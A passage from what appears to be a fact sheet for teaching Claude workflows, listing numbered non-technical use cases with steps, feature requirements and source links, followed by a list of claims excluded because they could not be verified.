| 7 | Research → presentation | Researchers, anyone presenting findings | 1 Upload the paper and data; connect Drive/Canva. 2 Pull out 3–4 key findings and a narrative. 3 Generate the slide outline and speaker notes. 4 Iterate slide by slide. 5 Rehearse with voice mode. | Connectors ✓, File creation ✓ (voice mode: not verified) | https://academy.claude.com/use-cases/turn-research-into-presentations |
| 8 | On-brand content set | Marketing, comms | 1 Put the brief, brand guidelines and best examples in a folder. 2 Run the draft-content skill. 3 Check the drafts with the brand-review skill. 4 Customize the skill and share it with the team. 5 Schedule runs for new briefs. | Plugins ✓, Skills (org-shared) ✓, Scheduled tasks ✓ | https://academy.claude.com/use-cases/on-brand-content |
| 9 | Forecast & scenarios | Finance / FP&A | 1 Load actuals, driver model and headcount plan. 2 Extend the model 4 quarters into base, upside and downside cases. 3 Log changed assumptions with deltas. 4 Write a one-page memo for leadership. 5 Schedule monthly reruns. | File creation (.xlsx/.docx) ✓, Skills ✓, Scheduled tasks ✓ | https://academy.claude.com/use-cases/forecast-scenarios |
| 10 | Investment / recommendation memo | Analysts, advisors | 1 Specify the company, metrics and memo format. 2 Connect financial data connectors. 3 Claude pulls the data and calculates. 4 Get a formatted Word memo. 5 Refine the citations, or turn it into slides. | Connectors ✓, Web search ✓, File creation ✓ | https://academy.claude.com/use-cases/draft-investment-memos |
| 11 | Synthesize customer feedback | Product, customer success, UX research | 1 Connect the feedback source and upload surveys and transcripts. 2 Ask for themes, needs and urgency. 3 Get an Excel workbook (themes, quotes, requests). 4 Validate the theme tab. 5 Segment and refine. | Connectors ✓, File creation (.xlsx) ✓ | https://academy.claude.com/use-cases/analyze-patterns-in-user-feedback |
| 12 | Meeting notes → tasks (Slack) | Project managers, delivery leads | 1 Invite Claude to the project channel; connect the recorder and tracker. 2 Enable proactive replies. 3 The transcript posts with @Claude. 4 Claude replies in the thread with decisions and actions and files tickets. 5 The team refines in the thread. | Claude in Slack ("Claude Tag"): NOT verified in this sheet. Use only if the Slack surface is added to the fact sheet. | https://academy.claude.com/use-cases/meeting-notes-and-filed-tasks-from-a-call-transcript |

Several examples call a role plugin skill by name (`/call-prep`, `/draft-content`, `/brand-review`,
`/financial-statements`, `/account-research`). Those exact skill names come from the use-case pages only; teach
them as "a plugin skill such as…", not as guaranteed commands.

### Not verified, excluded

- **The default state of the consumer "Help improve our AI models" toggle.** No official page fetched states whether
  it is pre-selected on or off. The press widely reports "on by default"; leave it out and teach "you choose — check
  Settings › Privacy".
- Team plan custom retention (the article is Enterprise-only) and Team-plan Zero Data Retention.
- Exact Cowork plan rollout of the merged "one Claude" experience for Team/Enterprise, and its timing ("rolling out in stages").
- A single status word for Cowork. Cloud/web/mobile sessions are labelled "beta"; desktop status was not confirmed.
  Computer use in Cowork is "beta on Pro/Max" according to the merge article only.
- Scheduled-task approval-mode option names.
- Claude Tag / Claude in Slack (see workflow 12), voice mode, Extended Thinking naming on claude.ai.
- Per-plan availability of specific third-party connectors (Salesforce, Gong, Apollo, Daloopa, S&P Global, Intercom,
  Canva, HubSpot, Notion).
- Any community-skill benchmark (caveman 33%/65%, ponytail 54%/20%). These are author claims; GitHub star counts
  (very high and fast-moving) are left out too.
- Whether Superpowers' listing in "claude-plugins-official" means Anthropic endorses it. That comes from the repo
  README only; don't call it Anthropic-approved.
- BMAD license, Kiro pricing/model details, OpenSpec specifics beyond the README lines above.
- Anthropic customer stories for non-technical workflows. None were fetched; the gallery uses Anthropic's own
  use-case pages only.
